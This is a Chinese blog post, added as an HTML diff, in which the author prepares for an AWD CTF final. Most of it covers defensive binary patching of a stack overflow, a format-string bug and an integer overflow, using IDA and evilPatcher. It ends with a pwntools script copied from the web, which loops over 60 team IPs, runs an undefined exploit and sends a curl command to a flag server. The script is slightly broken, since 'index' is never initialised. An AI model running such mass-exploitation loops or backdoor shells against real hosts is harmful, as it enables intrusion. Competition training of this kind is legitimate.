@@ -1,0 +1,370 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AWD小记 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="AWD小记为了准备这周末的磐石杯线下。从未接触过的主播不得不从网上寻找教程来慢慢学习。希望这次磐石的线下不会被踹飞吧… 为了更好的攻，我们首先的防好自己的程序。 所以为了在一定程度上通防，我们可以借助TTY-flag&#x2F;evilPatcher这个工具来做到修改较小字节在eh_frame段进行一些通防手段。比如加上沙箱。 使用步骤 1python3 &amp;#x27;&#x2F;home&#x2F;xizi&#x2F;evil">
+<meta property="og:type" content="website">
+<meta property="og:title" content="AWD小记">
+<meta property="og:url" content="http://example.com/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="AWD小记为了准备这周末的磐石杯线下。从未接触过的主播不得不从网上寻找教程来慢慢学习。希望这次磐石的线下不会被踹飞吧… 为了更好的攻，我们首先的防好自己的程序。 所以为了在一定程度上通防，我们可以借助TTY-flag&#x2F;evilPatcher这个工具来做到修改较小字节在eh_frame段进行一些通防手段。比如加上沙箱。 使用步骤 1python3 &amp;#x27;&#x2F;home&#x2F;xizi&#x2F;evil">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-09-16T14:38:51.000Z">
+<meta property="article:modified_time" content="2026-09-19T01:12:06.974Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="AWD">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'AWD小记',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">AWD小记</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="AWD小记"><a href="#AWD小记" class="headerlink" title="AWD小记"></a>AWD小记</h2><p>为了准备这周末的磐石杯线下。从未接触过的主播不得不从网上寻找教程来慢慢学习。希望这次磐石的线下不会被踹飞吧…</p>
+<p>为了更好的攻，我们首先的防好自己的程序。</p>
+<p>所以为了在一定程度上通防，我们可以借助<a target="_blank" rel="noopener" href="https://github.com/TTY-flag/evilPatcher">TTY-flag&#x2F;evilPatcher</a>这个工具来做到修改较小字节在<code>eh_frame</code>段进行一些通防手段。比如加上沙箱。</p>
+<p>使用步骤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="string">&#x27;/home/xizi/evilPatcher/evilPatcher.py&#x27;</span> filename <span class="string">&#x27;/home/xizi/evilPatcher/sandboxs/sandbox1.asm&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时，网上缺少免费开源的AWD pwn方向的资源。所以很多时候，我们都得自己写demo来熟悉防御过程。</p>
+<p>这个时候ida修改就显得至关重要了。这里推荐一个[ida 插件](<a target="_blank" rel="noopener" href="https://github.com/keystone-engine/keypatch">keystone-engine&#x2F;keypatch: Multi-architecture assembler for IDA Pro. Powered by Keystone Engine.</a>)。可以根据汇编来修改，而不需要硬背机器码。</p>
+<p>跳转指令</p>
+<p>无符号跳转</p>
+<table>
+<thead>
+<tr>
+<th>汇编指令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JA</td>
+<td>无符号大于则跳转</td>
+</tr>
+<tr>
+<td>JNA</td>
+<td>无符号不大于则跳转</td>
+</tr>
+<tr>
+<td>JAE</td>
+<td>无符号大于等于则跳转（同JNB）</td>
+</tr>
+<tr>
+<td>JNAE</td>
+<td>无符号不大于等于则跳转（同JB）</td>
+</tr>
+<tr>
+<td>JB</td>
+<td>无符号小于则跳转</td>
+</tr>
+<tr>
+<td>JNB</td>
+<td>无符号不小于则跳转</td>
+</tr>
+<tr>
+<td>JBE</td>
+<td>无符号小于等于则跳转（同JNA）</td>
+</tr>
+<tr>
+<td>JBNE</td>
+<td>无符号不小于等于则跳转（同JA）</td>
+</tr>
+</tbody></table>
+<p>有符号跳转</p>
+<table>
+<thead>
+<tr>
+<th>汇编指令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JG</td>
+<td>有符号大于则跳转</td>
+</tr>
+<tr>
+<td>JNG</td>
+<td>有符号不大于则跳转</td>
+</tr>
+<tr>
+<td>JGE</td>
+<td>有符号大于等于则跳转（同JNL）</td>
+</tr>
+<tr>
+<td>JNGE</td>
+<td>有符号不大于等于则跳转（同JL）</td>
+</tr>
+<tr>
+<td>JL</td>
+<td>有符号小于则跳转</td>
+</tr>
+<tr>
+<td>JNL</td>
+<td>有符号不小于则跳转</td>
+</tr>
+<tr>
+<td>JLE</td>
+<td>有符号小于等于则跳转（同JNG）</td>
+</tr>
+<tr>
+<td>JNLE</td>
+<td>有符号不小于等于则跳转（同JG）</td>
+</tr>
+</tbody></table>
+<h3 id="Patch-栈溢出"><a href="#Patch-栈溢出" class="headerlink" title="Patch-栈溢出"></a>Patch-栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里存在栈溢出，我们这里需要去修改gets()函数。</p>
+<p>看下汇编是什么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401136</span> main            proc near               ; DATA XREF: _start+<span class="number">18</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401136</span></span><br><span class="line">.text:<span class="number">0000000000401136</span> var_20          = byte ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000401136</span></span><br><span class="line">.text:<span class="number">0000000000401136</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401136</span>                 endbr64</span><br><span class="line">.text:<span class="number">000000000040113</span>A                 push    rbp</span><br><span class="line">.text:<span class="number">000000000040113B</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040113</span>E                 sub     rsp, <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000401142</span>                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000401149</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040114</span>E                 call    _gets</span><br><span class="line">.text:<span class="number">0000000000401153</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401158</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000401159</span>                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，除去函数序言，其实实际上gets函数的实现是从<code>0x401142</code>到<code>0x401153</code>。</p>
+<p>所以为了修改为安全版本。我们可以把gets改成—-&gt;<code>read(0,buf,len)</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = ams(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea rsi,[rbp+var_20]</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">push 0x1f</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以实现替换了，耗费字节是13。完全满足，其余多出来的字节数可以全部填满<code>nop</code>来过度。</p>
+<p>其实这样就改完了。</p>
+<p>最后呈现的就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401136</span> main            proc near               ; DATA XREF: _start+<span class="number">18</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401136</span></span><br><span class="line">.text:<span class="number">0000000000401136</span> buf             = byte ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000401136</span></span><br><span class="line">.text:<span class="number">0000000000401136</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401136</span>                 endbr64</span><br><span class="line">.text:<span class="number">000000000040113</span>A                 push    rbp</span><br><span class="line">.text:<span class="number">000000000040113B</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040113</span>E                 sub     rsp, <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000401142</span>                 lea     rsi, [rbp+buf]  ; buf</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 xor     edi, edi        ; fd</span><br><span class="line">.text:<span class="number">0000000000401148</span>                 push    <span class="number">1F</span>h</span><br><span class="line">.text:<span class="number">000000000040114</span>A                 pop     rdx             ; count</span><br><span class="line">.text:<span class="number">000000000040114B</span>                 xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000040114</span>D                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">000000000040114F</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401150</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401151</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401152</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401153</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401158</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000401159</span>                 retn</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Patch-格式化字符串"><a href="#Patch-格式化字符串" class="headerlink" title="Patch-格式化字符串"></a>Patch-格式化字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里漏洞点肯定也很明显。就是这里的printf()格式化字符串漏洞。</p>
+<p>所以我们可以考虑把<code>printf(fmt)----&gt;printf(&quot;%s&quot;,fmt)</code>。或者直接把printf换成别的输出函数。不过仅限于当前只有利用格式化字符串的printf函数，不然感觉如果有输出欢迎语，用了占位符的可能会导致信息输出错误。或许会被check部分扣分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400460</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400400</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400467</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004004</span>A8↓o</span><br><span class="line">LOAD:<span class="number">0000000000400471</span> aGlibc225       db <span class="string">&#x27;GLIBC_2.2.5&#x27;</span>,<span class="number">0</span>      ; DATA XREF: LOAD:<span class="number">00000000004004B</span>8↓o</span><br><span class="line">LOAD:<span class="number">000000000040047</span>D aGlibc234       db <span class="string">&#x27;GLIBC_2.34&#x27;</span>,<span class="number">0</span>       ; DATA XREF: LOAD:<span class="number">00000000004004</span>C8↓o</span><br><span class="line">LOAD:<span class="number">0000000000400488</span> aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">0000000000400430</span>↑o</span><br></pre></td></tr></table></figure>
+
+<p>我们这里直接简单粗暴一点。找到这里的printf，然后用<code>U</code>取消定义。然后修改为puts函数。效果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400449</span> aRead           db <span class="string">&#x27;read&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400418</span>↑o</span><br><span class="line">LOAD:<span class="number">000000000040044</span>E aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">000000000040044</span>E                                         ; DATA XREF: LOAD:<span class="number">00000000004003E8</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400460</span> aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400400</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400465</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">0000000000400466</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">0000000000400467</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004004</span>A8↓o</span><br><span class="line">LOAD:<span class="number">0000000000400471</span> aGlibc225       db <span class="string">&#x27;GLIBC_2.2.5&#x27;</span>,<span class="number">0</span>      ; DATA XREF: LOAD:<span class="number">00000000004004B</span>8↓o</span><br><span class="line">LOAD:<span class="number">000000000040047</span>D aGlibc234       db <span class="string">&#x27;GLIBC_2.34&#x27;</span>,<span class="number">0</span>       ; DATA XREF: LOAD:<span class="number">00000000004004</span>C8↓o</span><br><span class="line">LOAD:<span class="number">0000000000400488</span> aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">0000000000400430</span>↑o</span><br></pre></td></tr></table></figure>
+
+<p>这里就很极端了。还是得看程序具体是存在什么样的利用。如果就这么暴力的话，感觉这么改是最方便的。</p>
+<h3 id="Patch-整型溢出"><a href="#Patch-整型溢出" class="headerlink" title="Patch-整型溢出"></a>Patch-整型溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	read(<span class="number">0</span>,buf,(<span class="type">unsigned</span> <span class="type">int</span>)n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整型溢出肯定是没跑了。问题是怎么去修改。</p>
+<p>其实也比较简单。我们只需要把read函数的<code>rdx</code>的参数固定就可以了。所以也是有足够的空间让我们来patch。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401231</span>                 mov     eax, dword ptr [rbp+nbytes]</span><br><span class="line">.text:<span class="number">0000000000401234</span>                 mov     edx, eax        ; nbytes</span><br><span class="line">.text:<span class="number">0000000000401236</span>                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">000000000040123</span>A                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">000000000040123</span>D                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">0000000000401242</span>                 call    _read</span><br><span class="line">.text:<span class="number">0000000000401247</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040124</span>C                 leave</span><br><span class="line">.text:<span class="number">000000000040124</span>D                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的edx是由eax传入的。所以我们这里改一下就可以了。</p>
+<h3 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h3><p>也是随便去网上扒的，得等到了线下再慢慢调整了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#</span></span><br><span class="line">flag1=[]</span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause() </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;10.50.&#123;&#125;.4&quot;</span>.<span class="built_in">format</span>(x+<span class="number">2</span>)</span><br><span class="line">        prot = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">            <span class="comment"># print ip</span></span><br><span class="line">        r = remote(ip,<span class="built_in">int</span>(prot))</span><br><span class="line">        <span class="comment">#攻击脚本</span></span><br><span class="line">        exp()</span><br><span class="line">        payload = <span class="string">&quot;curl http://10.0.1.2?token=CRUTRZIW&quot;</span><span class="comment">#根据主办方的要求来获取flag</span></span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        sleep(<span class="number">1</span>)<span class="comment">#在一些靶机多的环境下最好加几个sleep，防止卡住</span></span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        flag = r.recv(<span class="number">0x20</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(flag))</span><br><span class="line">        flag1.append(flag)</span><br><span class="line">        index+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(ip)</span><br><span class="line">            r.close()</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;本轮共拿到&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;个队伍的flag&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="抄流量反打"><a href="#抄流量反打" class="headerlink" title="抄流量反打"></a>抄流量反打</h3><p>由于缺少具体环境，给出参考连接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13321">AWD PWN方法总结-先知社区</a></p>
